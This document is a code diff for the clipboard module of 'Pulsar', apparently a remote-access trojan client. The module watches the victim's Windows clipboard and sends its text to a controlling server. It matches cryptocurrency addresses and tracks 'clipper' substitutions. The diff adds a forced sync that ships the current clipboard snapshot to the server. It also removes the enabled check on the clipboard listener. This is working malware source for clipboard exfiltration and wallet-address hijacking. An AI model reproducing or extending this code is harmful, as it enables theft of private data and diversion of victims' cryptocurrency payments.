@@ -7,6 +7,7 @@ using Pulsar.Client.Networking;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Monitoring.Clipboard;
 using System.Diagnostics;
+using System.Threading;
 
 namespace Pulsar.Client.User
 {
@@ -15,6 +16,7 @@ namespace Pulsar.Client.User
     {
         private readonly PulsarClient _client;
         private readonly List<Tuple<string, Regex>> _regexPatterns;
+        private readonly SynchronizationContext _syncContext;
         private string _lastClipboardText = "";
         private bool _isEnabled = false;
         
@@ -44,11 +46,12 @@ namespace Pulsar.Client.User
                 new Tuple<string, Regex>("BCH", new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"))  // BCH regex
 
             };
+            _syncContext = SynchronizationContext.Current;
+
             this.CreateHandle(new CreateParams());
             AddClipboardFormatListener(this.Handle);
-            
-            _isEnabled = true;
-            Debug.WriteLine("ClipboardChecker: Initialized with monitoring enabled");
+
+            Debug.WriteLine("ClipboardChecker: Initialized with clipboard sync disabled");
         }
 
         /// <summary>
@@ -60,20 +63,26 @@ namespace Pulsar.Client.User
             set
             {
                 _isEnabled = value;
-                Debug.WriteLine($"ClipboardChecker: Monitoring {(value ? "enabled" : "disabled")}");
+                Debug.WriteLine($"ClipboardChecker: Clipboard sync {(value ? "enabled" : "disabled")}");
+
+                if (value)
+                {
+                    RequestClipboardSync();
+                }
             }
         }
 
         protected override void WndProc(ref Message m)
         {
-            if (m.Msg == WM_CLIPBOARDUPDATE && _isEnabled)
+            if (m.Msg == WM_CLIPBOARDUPDATE)
             {
                 ClipboardCheck();
             }
 
             base.WndProc(ref m);
-        }        
-        private void ClipboardCheck()
+        }
+
+        private void ClipboardCheck(bool forceSend = false)
         {
             try
             {
@@ -89,9 +98,11 @@ namespace Pulsar.Client.User
                     }
 
                     bool isNewText = clipboardText != _lastClipboardText;
-                    Debug.WriteLine($"Is new text: {isNewText}");
+                    bool shouldProcess = isNewText || forceSend;
+
+                    Debug.WriteLine($"Is new text: {isNewText}, Force send: {forceSend}");
                     
-                    if (isNewText)
+                    if (shouldProcess)
                     {
                         _lastClipboardText = clipboardText;
 
@@ -101,15 +112,22 @@ namespace Pulsar.Client.User
                             Messages.ClipboardHandler._lastReceivedClipboardText.Equals(clipboardText) &&
                             (DateTime.Now - Messages.ClipboardHandler._lastReceivedTime).TotalSeconds < 2;
 
+                        if (forceSend)
+                        {
+                            wasRecentlyReceivedFromServer = false;
+                        }
+
                         Debug.WriteLine($"Is clipper address: {isClipperAddress}, Was from server recently: {wasRecentlyReceivedFromServer}");
                         
                         if (!isClipperAddress && !wasRecentlyReceivedFromServer)
                         {
-                            Debug.WriteLine("New clipboard text detected, sending to server...");
+                            Debug.WriteLine(forceSend && !isNewText
+                                ? "Clipboard sync enabled, sending current clipboard snapshot to server..."
+                                : "New clipboard text detected, notifying server...");
                             Debug.WriteLine($"Client detected clipboard change: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
-                            
+
                             _client.Send(new SetUserClipboardStatus { ClipboardText = clipboardText });
-                            
+
                             foreach (var pattern in _regexPatterns)
                             {
                                 if (pattern.Item2.IsMatch(clipboardText))
@@ -130,6 +148,26 @@ namespace Pulsar.Client.User
             catch (Exception ex)
             {
                 Debug.WriteLine(ex.Message);
+            }
+        }
+
+        /// <summary>
+        /// Requests an immediate clipboard sync when enabled.
+        /// </summary>
+        public void RequestClipboardSync()
+        {
+            if (!_isEnabled)
+            {
+                return;
+            }
+
+            if (_syncContext != null)
+            {
+                _syncContext.Post(_ => ClipboardCheck(forceSend: true), null);
+            }
+            else
+            {
+                ClipboardCheck(forceSend: true);
             }
         }
 
